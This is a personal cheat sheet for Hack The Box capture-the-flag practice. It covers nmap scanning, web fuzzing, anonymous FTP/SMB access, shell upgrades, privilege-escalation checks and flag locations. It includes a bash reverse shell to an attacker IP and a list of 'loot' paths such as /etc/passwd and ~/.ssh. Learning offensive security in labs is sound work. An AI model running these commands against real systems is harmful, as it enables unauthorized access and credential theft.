# 🧠 HTB Cheatsheet

Quick reference for Hack The Box workflow, recon, enumeration, exploitation, and privesc.

---

## 🔍 Recon - Nmap

```bash
# Full TCP scan (no ping)
nmap -p- -T4 -Pn <IP>

# Service/version detection on top 1000
nmap -sC -sV -oN service_scan.txt <IP>

# Quick scan
nmap -T4 -F <IP>
```

---

## 🌐 Web Fuzzing - FFUF / Gobuster

```bash
# FFUF - Directory scan
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Gobuster - Directory scan
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

---

## 📁 File Services (FTP / SMB)

### FTP
```bash
ftp <IP>
anonymous
ls
```

### SMB
```bash
smbclient -L //<IP> -N
smbclient //<IP>/sharename -N
```

---

## 🐚 Shell Tricks

```bash
# Upgrade to full TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo; fg
export TERM=xterm-256color
```

```bash
# Reverse shell (bash)
bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1
```

---

## 🔐 Privilege Escalation Checklist

- [ ] Check `sudo -l`
- [ ] Look for SUID binaries (`find / -perm -4000 2>/dev/null`)
- [ ] Crontab jobs
- [ ] World-writable files/scripts
- [ ] Kernel exploits (use `uname -a`)
- [ ] LinPEAS / pspy

---

## 🏁 HTB Flags

- 🧍 `user.txt` → usually in `/home/<user>/`
- 👑 `root.txt` → always in `/root/`

Use `cat` to print and copy the flag.

---

## 🧼 Loot Locations

```bash
~/.bash_history
/var/www/html
/etc/passwd
/home/*/.ssh/
```

---

## 💾 Useful Tools

- `nmap`, `rustscan`, `ffuf`, `gobuster`
- `smbclient`, `hydra`, `john`, `netcat`, `nc`
- `python3 -m http.server`

---

## 🗂 Reference

Add this to daily logs:
```markdown
📚 Reference: [[notes/htb-cheatsheet.md]]
```
